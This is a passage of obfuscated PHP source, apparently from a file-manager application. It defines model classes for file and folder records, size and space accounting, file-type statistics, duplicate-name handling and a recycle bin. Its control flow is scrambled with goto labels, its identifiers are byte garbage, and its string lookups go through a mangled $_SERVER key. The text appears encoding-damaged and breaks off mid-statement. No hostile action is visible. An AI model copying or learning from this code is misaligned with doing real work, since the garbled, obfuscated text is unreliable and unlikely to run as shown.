$d¬ŒŸèÆ‚¨ = array($f‚ÃĞó†[527] => array($f‚ÃĞó†[485], $Cˆƒ‘öÌØ[$f‚ÃĞó†[461]] . $C˜á ö¸¾ï . $f‚ÃĞó†[486]), $f‚ÃĞó†[396] => intval($Cˆƒ‘öÌØ[$f‚ÃĞó†[397]]), $f‚ÃĞó†[520] => 1); $C®Á­ó–Ş = $this->where($d¬ŒŸèÆ‚¨)->count(); $BÕ‡¿Ã¬ = $this->where($d¬ŒŸèÆ‚¨)->where(array($f‚ÃĞó†[520] => 0))->count(); return array($f‚ÃĞó†[81] => $BÕ‡¿Ã¬, $f‚ÃĞó†[82] => $C®Á­ó–Ş); } public function pathInfo($c‚Š™ê›œ, $C ˜Ş±ä—¿ = false) { goto AÎ°íØæ; fñî…‹Ğ»: if (!$CÁ¸—…ò) { return !1; } $CÁ¸—…ò = $this->_listDataApplyItem($CÁ¸—…ò, $C ˜Ş±ä—¿); self::$cachePathInfo[$AØÓ¹°ôŒ] = $CÁ¸—…ò; goto a¦£–ö‡‘; a¦£–ö‡‘: return $CÁ¸—…ò; goto e«½Á”´ÀŒ; Fš¹¦î‰¨‹: $f¢º¨š—£¯ = _get(self::$cachePathInfo, $AØÓ¹°ôŒ); if ($f¢º¨š—£¯) { return $f¢º¨š—£¯; } $CÁ¸—…ò = $this->sourceInfo($c‚Š™ê›œ); goto fñî…‹Ğ»; AÎ°íØæ: $D´“ÆÖ¯Õ =& $_SERVER[“]; $c‚Š™ê›œ = intval($c‚Š™ê›œ); $AØÓ¹°ôŒ = $D´“ÆÖ¯Õ[411] . intval($C ˜Ş±ä—¿) . $D´“ÆÖ¯Õ[412] . $c‚Š™ê›œ; goto Fš¹¦î‰¨‹; e«½Á”´ÀŒ: } public static $cachePathInfoMore = array(); public function pathInfoMore($fÁËùè°¨) { goto Báä¹­³³Ò; AÕÙŠ¥¼ì¥: self::$cachePathInfoMore[$fÁËùè°¨] = $aÁàĞ„ÑéÇ; return $aÁàĞ„ÑéÇ; goto CÑï•ƒœŠ›; A²–ÍÔ™å: $aÁàĞ„ÑéÇ = $this->pathInfo($fÁËùè°¨); if (!$aÁàĞ„ÑéÇ) { return !1; } if ($aÁàĞ„ÑéÇ[$cŒ—¯·•À[370]] == $cŒ—¯·•À[83]) { $aÁàĞ„ÑéÇ[$cŒ—¯·•À[80]] = $this->folderChildrenNumber($fÁËùè°¨); } goto AÕÙŠ¥¼ì¥; Báä¹­³³Ò: $cŒ—¯·•À =& $_SERVER[“]; $a­—ÁñÁ¥¹ = _get(self::$cachePathInfoMore, $fÁËùè°¨); if ($a­—ÁñÁ¥¹) { return $a­—ÁñÁ¥¹; } goto A²–ÍÔ™å; CÑï•ƒœŠ›: } public function sourceInfo($e·×ÀÆ‚Î¸) { goto a»Ì…œæ›ê; cğÀñ­ğ: $D¾Õ©‹èŠŠ = $bÂ±ò†Àã [410] . $e·×ÀÆ‚Î¸; $aŒˆÊ×¢Ï‡ = _get(self::$cacheSourceInfo, $D¾Õ©‹èŠŠ); if ($aŒˆÊ×¢Ï‡) { return $aŒˆÊ×¢Ï‡; } goto b‚‘ˆÉä£; a»Ì…œæ›ê: $bÂ±ò†Àã  =& $_SERVER[“]; if (!$e·×ÀÆ‚Î¸) { return array(); } $e·×ÀÆ‚Î¸ = intval($e·×ÀÆ‚Î¸); goto cğÀñ­ğ; b‚‘ˆÉä£: $f¶¹®ŠÀ˜Ã = $this->where(array($bÂ±ò†Àã [369] => $e·×ÀÆ‚Î¸))->find(); self::$cacheSourceInfo[$D¾Õ©‹èŠŠ] = $f¶¹®ŠÀ˜Ã; return self::$cacheSourceInfo[$D¾Õ©‹èŠŠ]; goto cÇˆÁ¼‹ïÆ; cÇˆÁ¼‹ïÆ: } public function sourceCacheClear($D‡®‚ÑòÅ“ = false) { if ($D‡®‚ÑòÅ“ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[“][410] . $D‡®‚ÑòÅ“]); } public function pathInfoByPath($AÛ¼ÆŞøÇ», $Dƒ¥—¼¿Š) { $bÈ»µÑÅ‚° =& $_SERVER[“]; $a–šã·åƒ = !$Dƒ¥—¼¿Š ? array() : explode($bÈ»µÑÅ‚°[8], trim($Dƒ¥—¼¿Š, $bÈ»µÑÅ‚°[8])); $aÉÇ¸ÒÅĞò = $AÛ¼ÆŞøÇ»; foreach ($a–šã·åƒ as $a¸¾ó›ŠÀœ) { $AÎœ®ß±ÜÇ = array($bÈ»µÑÅ‚°[463] => $aÉÇ¸ÒÅĞò, $bÈ»µÑÅ‚°[28] => $a¸¾ó›ŠÀœ); $A–°ë„µ¾ê = $this->where($AÎœ®ß±ÜÇ)->select(); if (!$A–°ë„µ¾ê) { return !1; } $A–°ë„µ¾ê = array_sort_by($A–°ë„µ¾ê, $bÈ»µÑÅ‚°[397]); $aÉÇ¸ÒÅĞò = $A–°ë„µ¾ê[0][$bÈ»µÑÅ‚°[369]]; } return $this->pathInfo($aÉÇ¸ÒÅĞò, !0); } protected function updateModifyTime($b¢ÚòîñÒ) { goto f ØäÔàô; E—Šù÷¸ÏÓ: $this->where($då÷˜„‘í)->save($f°„ŒèÏ); goto FãÀ¦”ç’ã; d¾İàâ—©: foreach ($b¢ÚòîñÒ as $DŠÁ¢í„Şè => $bİ†È²êªÔ) { $b¢ÚòîñÒ[$DŠÁ¢í„Şè] = intval($bİ†È²êªÔ); } $då÷˜„‘í = array($b®å±—‡±¨[369] => array($b®å±—‡±¨[7], $b¢ÚòîñÒ)); $f°„ŒèÏ = array($b®å±—‡±¨[526] => USER_ID, $b®å±—‡±¨[390] => time()); goto E—Šù÷¸ÏÓ; f ØäÔàô: $b®å±—‡±¨ =& $_SERVER[“]; if (!$b¢ÚòîñÒ) { return; } if (!is_array($b¢ÚòîñÒ)) { $b¢ÚòîñÒ = array($b¢ÚòîñÒ); } goto d¾İàâ—©; FãÀ¦”ç’ã: } public function folderSizeReset($A§ÛÇÑ…¹) { goto fˆ§´ÍÑ…µ; dÎÅ‰á§³Ø: CacheLock::unlock($aÛÁ®©“ªá); goto eâ¯¨”ô‘; fˆ§´ÍÑ…µ: $Eî®ÎèÚ©– =& $_SERVER[“]; if ($this->statusIgnoreResetSpace) { return; } $aÛÁ®©“ªá = $Eî®ÎèÚ©–[2364] . $A§ÛÇÑ…¹; goto D¡Ì¢‰´×; D¡Ì¢‰´×: CacheLock::lock($aÛÁ®©“ªá, 20); $this->sourceCacheClear($A§ÛÇÑ…¹); $BÄ¶‡¥È­è = $this->sourceInfo($A§ÛÇÑ…¹); goto E‹ø¥İˆ®È; E‹ø¥İˆ®È: $aÇİ¸™‡Ğø = array($Eî®ÎèÚ©–[368] => $A§ÛÇÑ…¹, $Eî®ÎèÚ©–[396] => 0); $dõÜÚ¾á§ = $this->where($aÇİ¸™‡Ğø)->sum($Eî®ÎèÚ©–[77]); $dõÜÚ¾á§ = intval($dõÜÚ¾á§); goto ağïÏéˆ›; B³ï§£‰×„: $A‡šò¬ùØ = $this->parentLevelArray($BÄ¶‡¥È­è[$Eî®ÎèÚ©–[461]]); if ($A‡šò¬ùØ) { $aÇİ¸™‡Ğø = array($Eî®ÎèÚ©–[369] => array($Eî®ÎèÚ©–[384], $A‡šò¬ùØ)); if ($DåïÄ–×Õ£ < 0) { $aÇİ¸™‡Ğø[$Eî®ÎèÚ©–[77]] = array($Eî®ÎèÚ©–[915], abs($DåïÄ–×Õ£)); } $this->where($aÇİ¸™‡Ğø)->setAdd($Eî®ÎèÚ©–[77], $DåïÄ–×Õ£); } $this->targetSpaceUpdate($BÄ¶‡¥È­è[$Eî®ÎèÚ©–[371]], $BÄ¶‡¥È­è[$Eî®ÎèÚ©–[458]]); goto dÎÅ‰á§³Ø; ağïÏéˆ›: $DåïÄ–×Õ£ = $dõÜÚ¾á§ - intval($BÄ¶‡¥È­è[$Eî®ÎèÚ©–[77]]); if ($DåïÄ–×Õ£ == 0) { return CacheLock::unlock($aÛÁ®©“ªá); } $this->where(array($Eî®ÎèÚ©–[383] => $A§ÛÇÑ…¹))->setField($Eî®ÎèÚ©–[77], $dõÜÚ¾á§); goto B³ï§£‰×„; eâ¯¨”ô‘: } public function folderSizeResetChildren($cçšµì‹Ìô) { goto eŞäİ×í²é; eŞäİ×í²é: $Cøª¨Òìò‚ =& $_SERVER[“]; $this->sourceCacheClear($cçšµì‹Ìô); $e…Á…¥ò‘ = $this->sourceInfo($cçšµì‹Ìô); goto CÃß¾‘”ìØ; a†±¤Éğ‹: foreach ($B§êÎˆï› as $c­Ïçøîé¤) { $Eç¬…†¡êˆ = $c­Ïçøîé¤[$Cøª¨Òìò‚[463]] . $Cøª¨Òìò‚[33]; if (!isset($dÌ½øÔóŠÎ[$Eç¬…†¡êˆ])) { continue; } if ($c­Ïçøîé¤[$Cøª¨Òìò‚[397]] == $dÌ½øÔóŠÎ[$Eç¬…†¡êˆ][$Cøª¨Òìò‚[397]]) { $dÌ½øÔóŠÎ[$Eç¬…†¡êˆ][$Cøª¨Òìò‚[77]] += $c­Ïçøîé¤[$Cøª¨Òìò‚[77]]; } } foreach ($dÌ½øÔóŠÎ as $c­Ïçøîé¤) { $c‘Ä·ğ‹ëö = $this->parentLevelArray($c­Ïçøîé¤[$Cøª¨Òìò‚[461]]); foreach ($c‘Ä·ğ‹ëö as $Eç¬…†¡êˆ) { $Eç¬…†¡êˆ = $Eç¬…†¡êˆ . $Cøª¨Òìò‚[33]; if (!isset($dÌ½øÔóŠÎ[$Eç¬…†¡êˆ])) { continue; } if ($c­Ïçøîé¤[$Cøª¨Òìò‚[397]] == $dÌ½øÔóŠÎ[$Eç¬…†¡êˆ][$Cøª¨Òìò‚[397]]) { $dÌ½øÔóŠÎ[$Eç¬…†¡êˆ][$Cøª¨Òìò‚[77]] += $c­Ïçøîé¤[$Cøª¨Òìò‚[77]]; } } } $f‘ˆ»ÏóĞ = array(); goto BÔ…•Ïµ•á; BÔ…•Ïµ•á: foreach ($dÌ½øÔóŠÎ as $c­Ïçøîé¤) { if ($c­Ïçøîé¤[$Cøª¨Òìò‚[77]] == $c­Ïçøîé¤[$Cøª¨Òìò‚[2366]]) { continue; } $f‘ˆ»ÏóĞ[] = array($Cøª¨Òìò‚[369], $c­Ïçøîé¤[$Cøª¨Òìò‚[369]], $Cøª¨Òìò‚[77], $c­Ïçøîé¤[$Cøª¨Òìò‚[77]]); } $this->saveAll($f‘ˆ»ÏóĞ); goto D”“Áñ«‹Ô; CÃß¾‘”ìØ: $CÙœÈ¨¸ñ = array($Cøª¨Òìò‚[520] => 1, $Cøª¨Òìò‚[527] => array($Cøª¨Òìò‚[485], $e…Á…¥ò‘[$Cøª¨Òìò‚[461]] . $cçšµì‹Ìô . $Cøª¨Òìò‚[486])); $D—¶Ôë¢Õø = $Cøª¨Òìò‚[2365]; $dÌ½øÔóŠÎ = $this->field($D—¶Ôë¢Õø)->where($CÙœÈ¨¸ñ)->select(); goto Dß½Ë‘î¾‰; f³Òğ‰ÂÈ: $dÌ½øÔóŠÎ[] = $e…Á…¥ò‘; $dÌ½øÔóŠÎ = array_to_keyvalue($dÌ½øÔóŠÎ, $Cøª¨Òìò‚[369]); foreach ($dÌ½øÔóŠÎ as $cë‰½·Ö§‘ => $c­Ïçøîé¤) { $dÌ½øÔóŠÎ[$cë‰½·Ö§‘][$Cøª¨Òìò‚[2366]] = $dÌ½øÔóŠÎ[$cë‰½·Ö§‘][$Cøª¨Òìò‚[77]]; $dÌ½øÔóŠÎ[$cë‰½·Ö§‘][$Cøª¨Òìò‚[77]] = 0; } goto a†±¤Éğ‹; Dß½Ë‘î¾‰: $CÙœÈ¨¸ñ[$Cøª¨Òìò‚[370]] = 0; $B§êÎˆï› = $this->field($D—¶Ôë¢Õø)->where($CÙœÈ¨¸ñ)->select(); if (!$B§êÎˆï›) { return; } goto f³Òğ‰ÂÈ; D”“Áñ«‹Ô: } public function userSpaceReset($DãÕ‰Ÿùˆƒ = false) { $b¸·¡¾ÏÒ =& $_SERVER[“]; $BëÄ´âí×Ó = $this->where(array($b¸·¡¾ÏÒ[371] => self::TYPE_USER, $b¸·¡¾ÏÒ[458] => $DãÕ‰Ÿùˆƒ, $b¸·¡¾ÏÒ[370] => 0))->sum($b¸·¡¾ÏÒ[77]); Model($b¸·¡¾ÏÒ[476])->userEdit($DãÕ‰Ÿùˆƒ, array($b¸·¡¾ÏÒ[2081] => $BëÄ´âí×Ó)); } public function targetSpaceUpdate($Fèª¹§¿Š, $FŠã˜¼´¸ñ) { $DÎšÓ«†Ôå =& $_SERVER[“]; if (!$FŠã˜¼´¸ñ) { return; } if (!in_array($Fèª¹§¿Š, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $cŒ´²ä§•æ = $this->targetSpaceSize($Fèª¹§¿Š, $FŠã˜¼´¸ñ); if ($Fèª¹§¿Š == self::TYPE_USER) { Model($DÎšÓ«†Ôå[476])->userEdit($FŠã˜¼´¸ñ, array($DÎšÓ«†Ôå[2081] => $cŒ´²ä§•æ)); } else { if ($Fèª¹§¿Š == self::TYPE_GROUP) { Model($DÎšÓ«†Ôå[460])->groupEdit($FŠã˜¼´¸ñ, array($DÎšÓ«†Ôå[2081] => $cŒ´²ä§•æ)); } } } public function targetSpaceSize($f“‰½„öàæ, $F‰ÜÅìÅÜ) { goto E÷íÄ¸—Ş; CïŠÚ£¹ó: return $e„…âÓ†; goto b–ĞÜæÚ‡–; E÷íÄ¸—Ş: $B†˜ëæª =& $_SERVER[“]; $Aì°åÑ¯ô¼ = $this->sourceRoot($f“‰½„öàæ, $F‰ÜÅìÅÜ, !0); if (!$Aì°åÑ¯ô¼) { return 0; } goto C«¨åºÂÓõ; D–˜àè³ñ‘: $eŸŠ°ŠÃÚ£ = array_to_keyvalue($eŸŠ°ŠÃÚ£, $B†˜ëæª[33], $B†˜ëæª[369]); $eŸŠ°ŠÃÚ£ = array_unique(array_filter($eŸŠ°ŠÃÚ£)); if ($eŸŠ°ŠÃÚ£) { $B­—Š»š = array($B†˜ëæª[383] => array($B†˜ëæª[384], $eŸŠ°ŠÃÚ£)); $e„…âÓ† += floatval($this->where($B­—Š»š)->sum($B†˜ëæª[77])); } goto CïŠÚ£¹ó; C«¨åºÂÓõ: $e„…âÓ† = floatval($Aì°åÑ¯ô¼[$B†˜ëæª[77]]); $B­—Š»š = array($B†˜ëæª[527] => array($B†˜ëæª[485], $B†˜ëæª[472] . $Aì°åÑ¯ô¼[$B†˜ëæª[369]] . $B†˜ëæª[486])); $eŸŠ°ŠÃÚ£ = Model($B†˜ëæª[395])->field($B†˜ëæª[383])->where($B­—Š»š)->select(); goto D–˜àè³ñ‘; b–ĞÜæÚ‡–: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($C”äá„‰·) { return $this->fileTypeProfile($C”äá„‰·, SourceModel::TYPE_USER); } public function groupFileTypeProfile($E—İ½½ğ Ú) { return $this->fileTypeProfile($E—İ½½ğ Ú, SourceModel::TYPE_GROUP); } private function fileTypeProfile($b›½Ü–ó, $Bµ£ŒÙ¢ö) { goto dºÜØÇ‚ãî; Aƒ®´÷† ï: foreach ($a°–¢ŸŞ†Á as $FœÆ§¦ => $FŒ¤Œ³ã…) { $AÃØÃÉ†‰Æ[$e˜Ö˜ë…[372]] = $this->fileTypeWhere($FœÆ§¦); $eÖØÌª¬ºŠ[$FœÆ§¦] = array($e˜Ö˜ë…[2369] => $FŒ¤Œ³ã…[$e˜Ö˜ë…[28]], $e˜Ö˜ë…[2370] => $this->where($AÃØÃÉ†‰Æ)->count(), $e˜Ö˜ë…[522] => $this->where($AÃØÃÉ†‰Æ)->sum($e˜Ö˜ë…[77])); } Cache::set($Dƒ¼…³áŒ†, $eÖØÌª¬ºŠ, 1200); return $eÖØÌª¬ºŠ; goto DôªÀ«Û¦; dºÜØÇ‚ãî: $e˜Ö˜ë… =& $_SERVER[“]; $Dƒ¼…³áŒ† = $e˜Ö˜ë…[2367] . $b›½Ü–ó . $e˜Ö˜ë…[70] . $Bµ£ŒÙ¢ö; $e¶ñÂ·«ğ = Cache::get($Dƒ¼…³áŒ†); goto B¾¿Ìó‡Ğƒ; D–åƒ¶‹à: $eÖØÌª¬ºŠ = array(); $eÖØÌª¬ºŠ[$e˜Ö˜ë…[2368]] = array($e˜Ö˜ë…[2369] => LNG($e˜Ö˜ë…[2368]), $e˜Ö˜ë…[2370] => $this->where($AÃØÃÉ†‰Æ)->count(), $e˜Ö˜ë…[522] => $this->where($AÃØÃÉ†‰Æ)->sum($e˜Ö˜ë…[77])); $a°–¢ŸŞ†Á = KodIO::fileTypeList(); goto Aƒ®´÷† ï; B¾¿Ìó‡Ğƒ: if ($e¶ñÂ·«ğ) { return $e¶ñÂ·«ğ; } $AÃØÃÉ†‰Æ = array($e˜Ö˜ë…[520] => 0); if ($b›½Ü–ó != !1) { $AÃØÃÉ†‰Æ[$e˜Ö˜ë…[458]] = $b›½Ü–ó; $AÃØÃÉ†‰Æ[$e˜Ö˜ë…[371]] = $Bµ£ŒÙ¢ö; } goto D–åƒ¶‹à; DôªÀ«Û¦: } public function fileNameExist($e‚îµ‰› , $cŒÃ²±ÁÒ) { $CÜ˜¨• „ =& $_SERVER[“]; $f…×ÔÛŒÎ = $this->childList($e‚îµ‰› ); foreach ($f…×ÔÛŒÎ as $E¼ÛèÑ¹À) { if ($E¼ÛèÑ¹À[$CÜ˜¨• „[28]] == $cŒÃ²±ÁÒ) { return $E¼ÛèÑ¹À[$CÜ˜¨• „[369]]; } } return !1; } public function childList($Eİá‰éäŒÖ) { goto eË—¢â…Û¯; FÛÍå¨á‰: self::$cacheChildList[$FÊ‹â¤ä«Ø] = $b‡Í¹ÑšÍ¼; foreach ($b‡Í¹ÑšÍ¼ as $a„½‡ÁõğÕ) { $FÊ‹â¤ä«Ø = $FõÚ®´¶ƒè[410] . $a„½‡ÁõğÕ[$FõÚ®´¶ƒè[369]]; self::$cacheSourceInfo[$FÊ‹â¤ä«Ø] = $a„½‡ÁõğÕ; } return $b‡Í¹ÑšÍ¼; goto fÂÙ÷ÎáÄ¸; eË—¢â…Û¯: $FõÚ®´¶ƒè =& $_SERVER[“]; $FÊ‹â¤ä«Ø = $FõÚ®´¶ƒè[2348] . $Eİá‰éäŒÖ; if (isset(self::$cacheChildList[$FÊ‹â¤ä«Ø])) { return self::$cacheChildList[$FÊ‹â¤ä«Ø]; } goto B³ğ¸µ¹ÜÒ; B³ğ¸µ¹ÜÒ: $e°Å¤ ˜Íô = array($FõÚ®´¶ƒè[463] => intval($Eİá‰éäŒÖ), $FõÚ®´¶ƒè[397] => 0); $b‡Í¹ÑšÍ¼ = $this->where($e°Å¤ ˜Íô)->select(); $b‡Í¹ÑšÍ¼ = $b‡Í¹ÑšÍ¼ ? $b‡Í¹ÑšÍ¼ : array(); goto FÛÍå¨á‰; fÂÙ÷ÎáÄ¸: } public function fileNameAuto($eÈ©®¤²Ó©, $Eœ²¬·Š, $CªÕƒÉˆÖÒ = REPEAT_RENAME, $Cœ«Ô¨ŒÊ = false) { $CÇ…ŠæÓÉ– =& $_SERVER[“]; $c“Ù’á°î = $this->childList($eÈ©®¤²Ó©); $c‰áØ¯ Š§ = array_to_keyvalue($c“Ù’á°î, $CÇ…ŠæÓÉ–[33], $CÇ…ŠæÓÉ–[28]); return $this->fileNameAutoGet($c‰áØ¯ Š§, $Eœ²¬·Š, $CªÕƒÉˆÖÒ, $Cœ«Ô¨ŒÊ); } public function fileNameAutoGet($cõ¤áºº­ã, $B³²Ù‹Ò, $E•Œªº×©‚, $Fµšäíóƒ) { $aë½ò–êÅ =& $_SERVER[“]; if ($E•Œªº×©‚ == REPEAT_REPLACE || !$cõ¤áºº­ã || !in_array_not_case($B³²Ù‹Ò, $cõ¤áºº­ã) || $Fµšäíóƒ && $E•Œªº×©‚ != REPEAT_RENAME_FOLDER) { return $B³²Ù‹Ò; } if ($E•Œªº×©‚ == REPEAT_SKIP) { return !1; } $bé¬îÂºóš = $aë½ò–êÅ[91] . get_path_ext($B³²Ù‹Ò); $bé¬îÂºóš = $bé¬îÂºóš == $aë½ò–êÅ[91] || $Fµšäíóƒ ? $aë½ò–êÅ[33] : $bé¬îÂºóš; for ($BŠ¾Ò±÷œŞ = 1; $BŠ¾Ò±÷œŞ <= count($cõ¤áºº­ã) + 1; $BŠ¾Ò±÷œŞ++) { $B¢í‹öÊ¿Æ = substr($B³²Ù‹Ò, 0, strlen($B³²Ù‹Ò) - strlen($bé¬îÂºóš)); $F²ò÷‹ø£ = $B¢í‹öÊ¿Æ . "\50{$BŠ¾Ò±÷œŞ}\x29{$bé¬îÂºóš}"; if (!in_array_not_case($F²ò÷‹ø£, $cõ¤áºº­ã)) { return $F²ò÷‹ø£; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145\137\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\164", "\146\165\156\143\x74\x69\157\156")); public function listData($fŠí§äŒ‹Œ = false) { $d¦Œ¶¼§ =& $_SERVER[“]; $fŠí§äŒ‹Œ = $fŠí§äŒ‹Œ ? $fŠí§äŒ‹Œ : USER_ID; $E¸ø…Æİù = $this->where(array($d¦Œ¶¼§[1413] => $fŠí§äŒ‹Œ))->select(); return array_to_keyvalue($E¸ø…Æİù, $d¦Œ¶¼§[33], $d¦Œ¶¼§[369]); } public function moveToRecycle($B…µÒ¶Ä±Ì) { goto BÎ˜¢Ú÷ì¤; BÎ˜¢Ú÷ì¤: $B¥×‘È‘‡ =& $_SERVER[“]; $A‹ÌêŒç² = Model($B¥×‘È‘‡[1104]); $D—õˆŒø‹ = $A‹ÌêŒç²->sourceInfo($B…µÒ¶Ä±Ì); goto c¹”¿­Ê‘î; D”‚»Óìß: $this->recycleMove($B…µÒ¶Ä±Ì, 1); if ($D—õˆŒø‹[$B¥×‘È‘‡[370]] == $B¥×‘È‘‡[83]) { $aö•İ‰Œ = array($B¥×‘È‘‡[527] => array($B¥×‘È‘‡[485], $D—õˆŒø‹[$B¥×‘È‘‡[461]] . $B…µÒ¶Ä±Ì . $B¥×‘È‘‡[486])); $A‹ÌêŒç²->where($aö•İ‰Œ)->setField($B¥×‘È‘‡[397], 1); } goto B ÙîšŸ×·; c¹”¿­Ê‘î: if (!$D—õˆŒø‹ || $D—õˆŒø‹[$B¥×‘È‘‡[397]] == $B¥×‘È‘‡[83]) { return; } $c…ğİ…ÉÇÇ = array($B¥×‘È‘‡[383] => $B…µÒ¶Ä±Ì, $B¥×‘È‘‡[1413] => USER_ID, $B¥×‘È‘‡[523] => $D—õˆŒø‹[$B¥×‘È‘‡[371]], $B¥×‘È‘‡[524] => $D—õˆŒø‹[$B¥×‘È‘‡[458]], $B¥×‘È‘‡[527] => $D—õˆŒø‹[$B¥×‘È‘‡[461]]); $this->add($c…ğİ…ÉÇÇ); goto D”‚»Óìß; B ÙîšŸ×·: } public function clear() { $this->remove(!1); } public function remove($A„ Ö«—… = false) { goto CÃó®êŸ; aÄÇ ÑõªŠ: $A„ Ö«—… = $A„ Ö«—… === !1 ? !1 : $A„ Ö«—…; $dù´¶¯–Õğ = array(); foreach ($B†„¸„ÂøŠ as $Bİ®õ„†‹) { if ($A„ Ö«—… != !1 && !in_array($Bİ®õ„†‹, $A„ Ö«—…)) { continue; } $Eí±”³“œö = $eÅœåìãóÈ->sourceInfo($Bİ®õ„†‹); $eÅœåìãóÈ->remove($Bİ®õ„†‹, !1); $d´¿–Ñ¥«¯ = $Eí±”³“œö[$fï±‰³ØñŞ[371]] . $fï±‰³ØñŞ[70] . $Eí±”³“œö[$fï±‰³ØñŞ[458]]; $dù´¶¯–Õğ[$d´¿–Ñ¥«¯] = array($fï±‰³ØñŞ[523] => $Eí±”³“œö[$fï±‰³ØñŞ[371]], $fï±‰³ØñŞ[458] => $Eí±”³“œö[$fï±‰³ØñŞ[458]]); $this->where(array($fï±‰³ØñŞ[369] => $Bİ®õ„†‹))->delete(); } goto báŠã™Æ¬; CÃó®êŸ: $fï±‰³ØñŞ =& $_SERVER[“]; $eÅœåìãóÈ = Model($fï±‰³ØñŞ[1104]); $B†„¸„ÂøŠ = $this->listData(); goto aÄÇ ÑõªŠ; báŠã™Æ¬: foreach ($dù´¶¯–Õğ as $f”»””Ë³Ø) { $eÅœåìãóÈ->targetSpaceUpdate($f”»””Ë³Ø[$fï±‰³ØñŞ[371]], $f”»””Ë³Ø[$fï±‰³ØñŞ[458]]); } goto fßä‘ÊæçÉ; fßä‘ÊæçÉ: } public function restore($EëËÌ¢ŒË© = false) { goto fšÔÍª¾‚Æ; fšÔÍª¾‚Æ: $E¯ªİ¹‡›Á =& $_SERVER[“]; $FÛÊÇ› = Model($E¯ªİ¹‡›Á[1104]); $Fêªæçø³é = $this->listData(); goto aÅŞ†ÓâŸÏ; aÅŞ†ÓâŸÏ: $EëËÌ¢ŒË© = $EëËÌ¢ŒË© == !1 ? !1 : $EëËÌ¢ŒË©; if (!$Fêªæçø³é) { return !0; } $BñƒÖİ®ô = array(); goto B’°Ç¶„; B’°Ç¶„: foreach ($Fêªæçø³é as $f¦©¦´Ô•õ) { goto a„åƒøÍø”; C¸ŞÌ†Äó: if ($eº˜¨ôñö®[$E¯ªİ¹‡›Á[370]] == $E¯ªİ¹‡›Á[83]) { $EÈ“¾ÊÎâ = array($E¯ªİ¹‡›Á[527] => array($E¯ªİ¹‡›Á[485], $eº˜¨ôñö®[$E¯ªİ¹‡›Á[461]] . $f¦©¦´Ô•õ . $E¯ªİ¹‡›Á[486])); $FÛÊÇ›->where($EÈ“¾ÊÎâ)->setField($E¯ªİ¹‡›Á[397], 0); $this->restoreFolderChildren($f¦©¦´Ô•õ, $Fêªæçø³é); } $this->where(array($E¯ªİ¹‡›Á[369] => $f¦©¦´Ô•õ))->delete(); $FÛÊÇ›->folderSizeReset($eº˜¨ôñö®[$E¯ªİ¹‡›Á[463]]); goto AâíÖƒ¹¿·; a„åƒøÍø”: if ($EëËÌ¢ŒË© != !1 && !in_array($f¦©¦´Ô•õ, $EëËÌ¢ŒË©)) { continue; } $eº˜¨ôñö® = $FÛÊÇ›->sourceInfo($f¦©¦´Ô•õ); $eŠòÑÊ¦Ëù = $FÛÊÇ›->sourceInfo($eº˜¨ôñö®[$E¯ªİ¹‡›Á[463]]); goto a£¶«“”Û¡; AâíÖƒ¹¿·: $BñƒÖİ®ô[] = $eº˜¨ôñö®[$E¯ªİ¹‡›Á[463]]; if ($eº˜¨ôñö®[$E¯ªİ¹‡›Á[370]] == $E¯ªİ¹‡›Á[83]) { $BñƒÖİ®ô[] = $f¦©¦´Ô•õ; } $FÛÊÇ›->lockMoveEnd($f¦©¦´Ô•õ); goto d°Ò¿òâ¯£; a£¶«“”Û¡: if ($eŠòÑÊ¦Ëù[$E¯ªİ¹‡›Á[397]] == $E¯ªİ¹‡›Á[83]) { continue; } $FÛÊÇ›->lockMoveStart($f¦©¦´Ô•õ); $this->recycleMove($f¦©¦´Ô•õ, 0); goto C¸ŞÌ†Äó; d°Ò¿òâ¯£: } $FÛÊÇ›->updateModifyTime($BñƒÖİ®ô); goto F¹‚ö»‹ù®; F¹‚ö»‹ù®: } private function restoreFolderChildren($A†™ñ„Ò, $CÛ©¼èÈº) { goto a‚á¯‚àæ¬; a‚á¯‚àæ¬: $b¡Ã¤†Úõë =& $_SERVER[“]; $A¥‹Óã©å° = Model($b¡Ã¤†Úõë[1104]); $dÓéµ­™ªå = array($b¡Ã¤†Úõë[369] => array($b¡Ã¤†Úõë[7], array())); goto bÎ«‘›¢’; Eõ¸–ˆÁĞÃ: $dÓéµ­™ªå[$b¡Ã¤†Úõë[369]][1] = array_unique($dÓéµ­™ªå[$b¡Ã¤†Úõë[369]][1]); $dÓéµ­™ªå[$b¡Ã¤†Úõë[900]] = $b¡Ã¤†Úõë[2180]; $A¥‹Óã©å°->where($dÓéµ­™ªå)->setField($b¡Ã¤†Úõë[397], 1); goto ašæ÷¨Ü á; bÎ«‘›¢’: foreach ($CÛ©¼èÈº as $Fô†ÃõÃŠá) { if ($Fô†ÃõÃŠá == $A†™ñ„Ò) { continue; } if (!$A¥‹Óã©å°->isParentOf($A†™ñ„Ò, $Fô†ÃõÃŠá)) { continue; } $Dƒè½‰‹ = $A¥‹Óã©å°->sourceInfo($Fô†ÃõÃŠá); if ($Dƒè½‰‹[$b¡Ã¤†Úõë[370]] == $b¡Ã¤†Úõë[83]) { $dÓéµ­™ªå[] = array($b¡Ã¤†Úõë[527] => array($b¡Ã¤†Úõë[485], $Dƒè½‰‹[$b¡Ã¤†Úõë[461]] . $Fô†ÃõÃŠá . $b¡Ã¤†Úõë[486])); } else { $dÓéµ­™ªå[$b¡Ã¤†Úõë[369]][1][] = $Fô†ÃõÃŠá; } } if (!$dÓéµ­™ªå[$b¡Ã¤†Úõë[369]][1]) { unset($dÓéµ­™ªå[$b¡Ã¤†Úõë[369]]); } if (!$dÓéµ­™ªå) { return; } goto Eõ¸–ˆÁĞÃ; ašæ÷¨Ü á: } private function recycleMove($bâèÅò• º, $c‡İìëÎ† = 1) { $B”œİ›Šá =& $_SERVER[“]; $e‘–¨Ç² = Model($B”œİ›Šá[1104]); $DŠ‘£‰Ûë¸ = Model($B”œİ›Šá[2371]); $F†ñ‰ ¿³î = array($B”œİ›Šá[369] => $bâèÅò• º); if ($c‡İìëÎ†) { $e‘–¨Ç²->where($F†ñ‰ ¿³î)->setField($B”œİ›Šá[397], 1); $DŠ‘£‰Ûë¸->eventRecycle($bâèÅò• 